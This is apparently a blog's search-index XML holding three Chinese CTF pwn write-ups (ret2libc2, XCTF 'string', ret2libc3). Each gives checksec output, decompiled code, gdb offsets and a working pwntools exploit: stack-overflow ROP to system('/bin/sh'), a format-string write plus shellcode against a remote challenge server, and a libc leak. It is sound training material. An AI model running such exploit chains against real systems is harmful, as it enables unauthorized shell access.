<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>wiki-ret2libc2</title>
      <link href="/2020/07/06/wiki-ret2libc2/"/>
      <url>/2020/07/06/wiki-ret2libc2/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>hunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2[*] &#39;/home/hunter/PWN/wiki/overflow/ret2libc2&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>又是只有NX开启的常规操作</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-64h]  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 1, 0);  puts(&quot;Something surprise here, but I don&#39;t think it will work.&quot;);  printf(&quot;What do you think ?&quot;);  gets(&amp;s);  return 0;}</code></pre><p><strong>显然gets这里有栈溢出，用IDA检查字符串发现有system函数，但是没有/bin/sh字符串</strong></p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre><code>[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --&gt; 0xfbad2288 EDX: 0xf7fb389c --&gt; 0x0 ESI: 0xf7fb2000 --&gt; 0x1d4d6c EDI: 0x0 EBP: 0x6941414d (&#39;MAAi&#39;)ESP: 0xffffd03c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)EIP: 0x80486c5 (&lt;main+125&gt;:    ret)EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x80486ba &lt;main+114&gt;:    call   0x8048460 &lt;gets@plt&gt;   0x80486bf &lt;main+119&gt;:    mov    eax,0x0   0x80486c4 &lt;main+124&gt;:    leave  =&gt; 0x80486c5 &lt;main+125&gt;:    ret       0x80486c6:    xchg   ax,ax   0x80486c8:    xchg   ax,ax   0x80486ca:    xchg   ax,ax   0x80486cc:    xchg   ax,ax[------------------------------------stack-------------------------------------]0000| 0xffffd03c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0004| 0xffffd040 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0008| 0xffffd044 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0012| 0xffffd048 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0016| 0xffffd04c (&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0020| 0xffffd050 (&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0024| 0xffffd054 (&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0028| 0xffffd058 (&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x080486c5    30    in ret2libc.cgdb-peda$ pattern offset AA8AAA8A found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><p><strong>首先因为在程序中可以直接利用system函数，还有栈溢出跳转到system函数，接下来就是想办法得到/bin/sh字符串。</strong><br><strong>一般的如果题目没有给libc文件不老要想着找到libc地址来解题。那么不考虑libc文件中的/bin/sh字符串，我们看能不能利用输入来获得该字符串。</strong><br><strong>仔细看IDA主函数的伪代码会发现有个函数将bss段清零了（当然bss一般本来就是0）这应该就是给我们提示了，利用bss段全局变量来存放我们输入的/bin/sh，这样就可以让system函数利用这个字符串。那么输入函数这里直接有gets函数。ok构造exp</strong></p><h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre><code>from pwn import*context.log_level = &#39;debug&#39;elf = ELF(&#39;ret2libc2&#39;)system_addr = elf.plt[&#39;system&#39;]gets_plt = elf.plt[&#39;gets&#39;]bss_addr = 0x0804A040   #bss段的地址都可以在IDA找到main = elf.symbols[&#39;main&#39;] sh = process(&#39;./ret2libc2&#39;)sh.recv()payload = &quot;A&quot;*112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(bss_addr) #gdb.attach(sh)sh.sendline(payload)sh.interactive()</code></pre><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>之前我一直认为这个payload=payload = “A”<em>112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(system_ret) + p32(bss_addr)是完全没问题的，system_ret即将作为system函数的返回地址。<br>我这么认为是因为，我以为用p32(gets_plt）执行后p32(system_addr)作为返回地址，p32(bss_addr)作为参数：程序将跳转到system函数，<del>而p32(bss_addr)将被gets函数从栈中取出</del><br>**</em>后面这个想法大错特错，用gdb调试发现返回地址，和参数一直都在栈中，只是利用参数时会进行值的传递，而不是取出。**<br><img src="https://s1.ax1x.com/2020/07/06/UCWhEq.png" alt="函数调用过程"></p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-string</title>
      <link href="/2020/07/04/xctf-string/"/>
      <url>/2020/07/04/xctf-string/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>hunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string[*] &#39;/home/hunter/PWN/XCTF/xctf_easy/string&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>保护全开有点狠，但是不用慌，这应该告诉我们栈溢出控制程序是不可能的了</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><p>程序比较大，下面是进行拆分排序后的函数组合</p><pre><code>main：__int64 __fastcall main(__int64 a1, char **a2, char **a3){  _DWORD *v3; // rax  __int64 v4; // ST18_8  setbuf(stdout, 0LL);  alarm(60u);  sub_400996();                                 // 菜单输出，不用在意  v3 = malloc(8uLL);                            // 开辟内存空间  v4 = (__int64)v3;  *v3 = 68;  v3[1] = 85;  puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);  puts(&quot;we will tell you two secret ...&quot;);  printf(&quot;secret[0] is %x\n&quot;, v4, a2);          // 将输出第一个和第二个元素的地址                                                //   printf(&quot;secret[1] is %x\n&quot;, v4 + 4);  puts(&quot;do not tell anyone &quot;);  sub_400D72(v4);                               // 将开辟内存空间传入该函数  puts(&quot;The End.....Really?&quot;);  return 0LL;}sub_400D72函数：// a1是前面开辟内存空间的地址unsigned __int64 __fastcall sub_400D72(__int64 a1){  char s; // [rsp+10h] [rbp-20h]  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(40u);  puts(&quot;What should your character&#39;s name be:&quot;);  _isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;s);  if ( strlen(&amp;s) &lt;= 12 )  {    puts(&quot;Creating a new player.&quot;);    sub_400A7D();                               // 只能输入east    sub_400BB9();                               // 格式化字符串漏洞    sub_400CA6((_DWORD *)a1);                   // 映射一个大小为4096字节的空间 该空间由读写执行权 传入了开辟空间的地址a1  }  else  {    puts(&quot;Hei! What&#39;s up!&quot;);  }  return __readfsqword(0x28u) ^ v3;}sub_400A7D函数：执行后我们能且只能输入east，没多大用sub_400BB9函数：unsigned __int64 sub_400BB9(){  int v1; // [rsp+4h] [rbp-7Ch]  __int64 v2; // [rsp+8h] [rbp-78h]  char format; // [rsp+10h] [rbp-70h]  unsigned __int64 v4; // [rsp+78h] [rbp-8h]  v4 = __readfsqword(0x28u);  v2 = 0LL;  puts(&quot;You travel a short distance east.That&#39;s odd, anyone disappear suddenly&quot;);  puts(&quot;, what happend?! You just travel , and find another hole&quot;);  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);  puts(&quot;go into there(1), or leave(0)?:&quot;);  _isoc99_scanf((__int64)&quot;%d&quot;, (__int64)&amp;v1);  if ( v1 == 1 )  {    puts(&quot;A voice heard in your mind&quot;);    puts(&quot;&#39;Give me an address&#39;&quot;);    _isoc99_scanf((__int64)&quot;%ld&quot;, (__int64)&amp;v2);    puts(&quot;And, you wish is:&quot;);    _isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;format);    puts(&quot;Your wish is&quot;);    printf(&amp;format, &amp;format);                   // 格式化字符串漏洞                                                //     puts(&quot;I hear it, I hear it....&quot;);  }  return __readfsqword(0x28u) ^ v4;}sub_400CA6((_DWORD *)a1)函数：unsigned __int64 __fastcall sub_400CA6(_DWORD *a1){  void *v1; // rsi  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(40u);  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);  puts(&quot;skill! you could not defeat me !&quot;);  puts(&quot;That&#39;s sound terrible! you meet final boss!but you level is ONE!&quot;);  if ( *a1 == a1[1] )                           // 第一个元素等于第二个元素，这两个元素地址是相邻的  {    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);    v1 = mmap(0LL, 4096uLL, 7, 33, -1, 0LL);    // 映射一个大小为4096字节的空间 该空间有读写执行权    read(0, v1, 256uLL);    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);  //这里比较难理解  }  return __readfsqword(0x28u) ^ v3;}</code></pre><h2 id="3：解决疑难语句"><a href="#3：解决疑难语句" class="headerlink" title="3：解决疑难语句"></a>3：解决疑难语句</h2><p><strong>对于((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);这条语句我查了半天也没怎么理解，也就是说这个伪代码看不懂。在这种时候千万别忘了我们还可以看反汇编内容！！这一块区域的反汇编：</strong></p><pre><code>mov     edi, offset aWizardIWillHel ; &quot;Wizard: I will help you! USE YOU SPELL&quot;   call    putsmov     r9d, 0          ; offsetmov     r8d, 0FFFFFFFFh ; fdmov     ecx, 33         ; flagsmov     edx, 7          ; protmov     esi, 4096       ; lenmov     edi, 0          ; addrcall    mmapmov     [rbp+buf], raxmov     rax, [rbp+buf]mov     edx, 256        ; nbytesmov     rsi, rax        ; bufmov     edi, 0          ; fdcall    readmov     rax, [rbp+buf]mov     edi, 0call    rax</code></pre><p><strong>1-2：显然是对应：puts(“Wizard: I will help you! USE YOU SPELL”);这条语句，执行了这一条就能说明程序进入了if语句</strong><br><strong>3-9：是执行了mmap函数，先是将该函数的参数从右到左传入寄存器和一些特别的地方，最后进行调用mmap函数</strong><br><strong>10-15：主要是执行read函数，但我们可以发现这一段除了将传read函数的参数，还进行了其他操作。即第10第11条，将rax的值赋给[rbp+buf]代表的地址上面，又将[rbp+buf]代表的地址赋给rax。在传buf参数时，是将rax放入rsi，所以这个read函数将会入读数据到rax存放的地址上。结合IDA伪代码，这个地址就是可读可写可执行内存区，即[rbp+buf]所代表的地址。</strong><br><strong>16-18：将[rbp+buf]地址放入rax，17行应该不重要，18行就像调用函数一样直接调用rax。那么我们可以肯定((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1)可以执行程序读入的代码</strong></p><h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>1.main函数主要功能：开辟一个8字节的内存空间，该空间第一个元素大小赋值为68第二个元素大小赋值为85 ，输出两者的地址，然后进入sub_400D72(v4)函数<br>2.sub_400D72(v4)函数主要功能：输入一串字符作为角色名字，然后依次执行sub_400A7D()   sub_400BB9()  sub_400CA6((_DWORD *)a1)函数<br>3：sub_400A7D()函数主要功能：让用户输入test字符串，才能继续执行<br>4：sub_400BB9() 函数主要功能：输入1进入if语句，在该语句中先输入整数，再输入字符串，该字符串和后面的printf构成格式化字符串漏洞<br>5：sub_400CA6((_DWORD *)a1)函数主要功能：输出一堆废话 但是如果main函数中所开辟的空间中的第一个元素等于第二个元素，将映射一个有读写执行权的空间。然后在读取输入到空间中，最后那一串语句盲猜是要执行那段空间里面的数据</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>从main函数中得到两元素地址，在要执行sub_400BB9()函数时利用其包括的格式化字符串漏洞，改两个元素的值使其相等。这样在执行sub_400CA6((_DWORD *)a1)函数时就可以输入shellcode到一个映射空间，由下面的语句执行空间中的shellcode</strong></p><h2 id="4：exp"><a href="#4：exp" class="headerlink" title="4：exp"></a>4：exp</h2><pre><code>from pwn import*context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)context.log_level = &#39;debug&#39;#sh = process(&#39;./string&#39;)sh = remote(&quot;220.249.52.133&quot;,32219)sh.recvuntil(&#39;[0] is &#39;)addr1 = int(sh.recvuntil(&#39;\n&#39;), 16)   //获取地址sh.recvuntil(&#39;[1] is &#39;)addr2 = int(sh.recvuntil(&#39;\n&#39;),16)    //获取地址print addr1print addr2print type(addr1)sh.recv()payload1 = &#39;HUNTER&#39;sh.sendline(payload1)sh.recv()payload2 = &#39;east&#39;sh.sendline(payload2)sh.recv()sh.sendline(&#39;1&#39;)sh.recv()sh.sendline(&#39;123&#39;)sh.recv()#formal bugpayload3 = &quot;AAA%082d&quot; + &quot;%10$nAAA&quot; + p64(addr1)  #构造格式化字符串payload时要注意参数位置，以及对应程序操作位数#gdb.attach(sh)sh.sendline(payload3)sh.recv()#input shell&#39;&#39;&#39;payload4 = &quot;&quot;payload4 += &quot;\x01\x30\x8f\xe2&quot;payload4 += &quot;\x13\xff\x2f\xe1&quot;payload4 += &quot;\x78\x46\x0e\x30&quot;payload4 += &quot;\x01\x90\x49\x1a&quot;payload4 += &quot;\x92\x1a\x08\x27&quot;payload4 += &quot;\xc2\x51\x03\x37&quot;payload4 += &quot;\x01\xdf\x2f\x62&quot;payload4 += &quot;\x69\x6e\x2f\x2f&quot;payload4 += &quot;\x73\x68&quot;&#39;&#39;&#39;payload4 = asm(shellcraft.sh())sh.sendline(payload4)sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" class="headerlink" title="5：知识点"></a>5：知识点</h2><p>mmap函数 </p><blockquote><p>mmap函数是unix/linux下的系统调用。<br>当存在客户－服务程序中复制文件时候，其数据流如下，要经历四次数据复制，开销很大。<br><img src="https://s1.ax1x.com/2020/07/04/NzLPjU.png" alt=""><br>如果采用共享内存的方式，那么将大大优化IO操作，数据流变成了如下，数据只复制两次：<br><img src="https://s1.ax1x.com/2020/07/04/NzLCcT.png" alt=""><br>映射文件或设备到内存中，取消映射就是munmap函数。<br>语法如下：</p></blockquote><blockquote><p>void mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset);</p></blockquote><blockquote><p>int munmap(void *addr, size_t length);<br>该函数主要用途有三个：</p></blockquote><blockquote><p>1、将普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，用内存读写取代I/O读写，以获得较高的性能；</p></blockquote><blockquote><p>2、将特殊文件进行匿名内存映射，为关联进程提供共享内存空间；</p></blockquote><blockquote><p>3、为无关联的进程间的Posix共享内存（SystemV的共享内存操作是shmget/shmat）</p></blockquote><blockquote><p>我们来看下函数的入参选择：</p></blockquote><blockquote><p>1、参数addr：</p></blockquote><blockquote><p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p></blockquote><blockquote><p>2、参数length：</p></blockquote><blockquote><p>代表将文件中多大的部分映射到内存。</p></blockquote><blockquote><p>3、参数prot：</p></blockquote><blockquote><p>映射区域的保护方式。可以为以下几种方式的组合：</p></blockquote><blockquote><p>PROT_EXEC 映射区域可被执行</p></blockquote><blockquote><p>PROT_READ 映射区域可被读取</p></blockquote><blockquote><p>PROT_WRITE 映射区域可被写入</p></blockquote><blockquote><p>PROT_NONE 映射区域不能存取</p></blockquote><blockquote><p>4、参数flags：</p></blockquote><blockquote><p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p></blockquote><blockquote><p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此。</p></blockquote><blockquote><p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p></blockquote><blockquote><p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p></blockquote><blockquote><p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p></blockquote><blockquote><p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p></blockquote><blockquote><p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p></blockquote><blockquote><p>5、参数fd：</p></blockquote><blockquote><p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。</p></blockquote><blockquote><p>6、参数offset：</p></blockquote><blockquote><p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。如下图内存映射文件的示例。<br><img src="https://s1.ax1x.com/2020/07/04/NzLFuF.png" alt=""></p></blockquote><p>原文：<a href="https://segmentfault.com/a/1190000014616732" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014616732</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki--ret2libc3</title>
      <link href="/2020/07/04/wiki-ret2libc3/"/>
      <url>/2020/07/04/wiki-ret2libc3/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>hunter@hunter:~/PWN/level3$ checksec ret2libc3[*] &#39;/home/hunter/PWN/level3/ret2libc3&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>只有NX开启</p><h2 id="2：IDA-检查发现没有system和binsh字符串"><a href="#2：IDA-检查发现没有system和binsh字符串" class="headerlink" title="2：IDA 检查发现没有system和binsh字符串"></a>2：IDA 检查发现没有system和binsh字符串</h2><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-64h]  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);  printf(&quot;Can you find it !?&quot;);  gets(&amp;s);  return 0;}</code></pre><p>显然此处gets存在溢出</p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre><code>[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --&gt; 0xfbad2288 EDX: 0xf7fb389c --&gt; 0x0 ESI: 0xf7fb2000 --&gt; 0x1d4d6c EDI: 0x0 EBP: 0x6941414d (&#39;MAAi&#39;)ESP: 0xffffd04c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)EIP: 0x8048695 (&lt;main+125&gt;:    ret)EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x804868a &lt;main+114&gt;:    call   0x8048440 &lt;gets@plt&gt;   0x804868f &lt;main+119&gt;:    mov    eax,0x0   0x8048694 &lt;main+124&gt;:    leave  =&gt; 0x8048695 &lt;main+125&gt;:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   0x804869c:    xchg   ax,ax[------------------------------------stack-------------------------------------]0000| 0xffffd04c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0004| 0xffffd050 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0008| 0xffffd054 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0012| 0xffffd058 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0016| 0xffffd05c (&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0020| 0xffffd060 (&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0024| 0xffffd064 (&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0028| 0xffffd068 (&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x08048695    30    in ret2libcGOT.cgdb-peda$ pattern offset AA8AANAAA8AANA found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>存在栈溢出，可利用函数为puts  gets。我们构造一个puts函数让其输出puts函数的got表地址上的内容–即真正的地址，利用栈溢出控制程序转跳来实现。得到puts函数的确切地址后找到该函数在libc文件中的offset即求出libc地址，有了libc地址啥都好说。将上面构造的puts函数返回地址设置为main函数就可再次进行程序控制，不过这次控制它打开shell。</strong></p><p>exp：libc的地址也可以用__libc_start_main_got来获得</p><pre><code>from pwn import*from LibcSearcher import*context.log_level = &#39;debug&#39;elf = ELF(&quot;ret2libc3&quot;)puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]#__libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]main_addr = elf.symbols[&#39;main&#39;]sh = process(&quot;./ret2libc3&quot;)#payload1 = &quot;A&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(__libc_start_main_got)payload1 = &quot;A&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)sh.recv()gdb.attach(sh)sh.sendline(payload1)puts_addr = u32(sh.recv(4))libc = LibcSearcher(&quot;puts&quot;,puts_addr)libc_addr = puts_addr - libc.dump(&quot;puts&quot;)system_addr = libc_addr + libc.dump(&quot;system&quot;)binsh_addr = libc_addr + libc.dump(&quot;str_bin_sh&quot;)payload2 = &quot;A&quot;*112 + p32(system_addr) + p32(0) + p32(binsh_addr)sh.sendline(payload2)sh.interactive()</code></pre><h3 id="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"><a href="#在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化" class="headerlink" title="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"></a>在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化</h3><h2 id="4-探究"><a href="#4-探究" class="headerlink" title="4:探究"></a>4:探究</h2><p>我们来看看main函数的反汇编：</p><pre><code> 08048618 &lt;main&gt;: 8048618:    55                       push   ebp     8048619:    89 e5                    mov    ebp,esp 804861b:    83 e4 f0                 and    esp,0xfffffff0 804861e:    83 c4 80                 add    esp,0xffffff80 8048621:    a1 60 a0 04 08           mov    eax,ds:0x804a060 8048626:    c7 44 24 0c 00 00 00     mov    DWORD PTR [esp+0xc],0x0 804862d:    00  804862e:    c7 44 24 08 02 00 00     mov    DWORD PTR [esp+0x8],0x2 8048635:    00  8048636:    c7 44 24 04 00 00 00     mov    DWORD PTR [esp+0x4],0x0 804863d:    00  804863e:    89 04 24                 mov    DWORD PTR [esp],eax 8048641:    e8 5a fe ff ff           call   80484a0 &lt;setvbuf@plt&gt; 8048646:    a1 40 a0 04 08           mov    eax,ds:0x804a040 804864b:    c7 44 24 0c 00 00 00     mov    DWORD PTR [esp+0xc],0x0 8048652:    00  8048653:    c7 44 24 08 01 00 00     mov    DWORD PTR [esp+0x8],0x1 804865a:    00  804865b:    c7 44 24 04 00 00 00     mov    DWORD PTR [esp+0x4],0x0 8048662:    00  8048663:    89 04 24                 mov    DWORD PTR [esp],eax 8048666:    e8 35 fe ff ff           call   80484a0 &lt;setvbuf@plt&gt; 804866b:    c7 04 24 40 87 04 08     mov    DWORD PTR [esp],0x8048740 8048672:    e8 e9 fd ff ff           call   8048460 &lt;puts@plt&gt; 8048677:    c7 04 24 6b 87 04 08     mov    DWORD PTR [esp],0x804876b 804867e:    e8 ad fd ff ff           call   8048430 &lt;printf@plt&gt; 8048683:    8d 44 24 1c              lea    eax,[esp+0x1c] 8048687:    89 04 24                 mov    DWORD PTR [esp],eax 804868a:    e8 b1 fd ff ff           call   8048440 &lt;gets@plt&gt; 804868f:    b8 00 00 00 00           mov    eax,0x0 8048694:    c9                       leave   8048695:    c3                       ret   </code></pre><p>第一第二行是常规操作。</p><h4 id="第四第五行：被称为栈对齐"><a href="#第四第五行：被称为栈对齐" class="headerlink" title="第四第五行：被称为栈对齐"></a>第四第五行：被称为栈对齐</h4><pre><code>804861b:    83 e4 f0                 and    esp,0xfffffff0  //esp最后一个字节清零804861e:    83 c4 80                 add    esp,0xffffff80  //esp倒数第二个字节如果大于等于8则变为8，小于则清零，倒数第一个字节也清零</code></pre><h3 id="栈对齐有关资料：64位"><a href="#栈对齐有关资料：64位" class="headerlink" title="栈对齐有关资料：64位"></a>栈对齐有关资料：64位</h3><blockquote><p>许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象的地址必须是某个值K的倍数，其中K具体如下图。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。举个实际的例子：比如我们在内存中读取一个8字节长度的变量，那么这个变量所在的地址必须是8的倍数。如果这个变量所在的地址是8的倍数，那么就可以通过一次内存操作完成该变量的读取。倘若这个变量所在的地址并不是8的倍数，那么可能就需要执行两次内存读取，因为该变量被放在两个8字节的内存块中了。</p></blockquote><blockquote><p>无论数据是否对齐，x86_64硬件都能正常工作，但是却会降低系统的性能，所以我们的编译器在编译时一般会为我们实施数据对齐。</p></blockquote><blockquote><p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。<br>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p><blockquote><blockquote><p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：<br>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。<br>大多数函数的栈帧的边界都必须是16直接的倍数。<br>在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p></blockquote></blockquote></blockquote><p>详情见：<a href="https://www.cnblogs.com/tcctw/p/11333743.html" target="_blank" rel="noopener">https://www.cnblogs.com/tcctw/p/11333743.html</a></p><p>总结：为了满足数据对齐和栈字节对齐的要求，或者说规范，编译器不惜牺牲了部分内存，这使得程序提高了兼容性，也提高了程序的性能</p><p><strong>在常规操作push  ebp 和mov  ebp，esp后面免不了这种调整栈空间的指令 这样的指令对第一次求溢出是没有影响的，因为只要看最后的ret部分。但是如果进行第二次攻击再次从main函数进入将再次执行这样的影响 esp的指令 我们再次使用之前的溢出点就可能会出错。就像这里的栈对齐操作，显然这个操作与esp本身的大小有关。在程序最后直接ret到main函数会导致esp加4从而下次的栈对齐操作因为esp变化了所以栈空间也会发生变化。导致变化完了后esp到ebp的距离不再是114. 解决方法就是在脚本中用gdb.attach()进入调试在即将进行第二次之前在main函数下断点，从而观察，调整溢出点。</strong></p><h3 id="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"><a href="#下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104" class="headerlink" 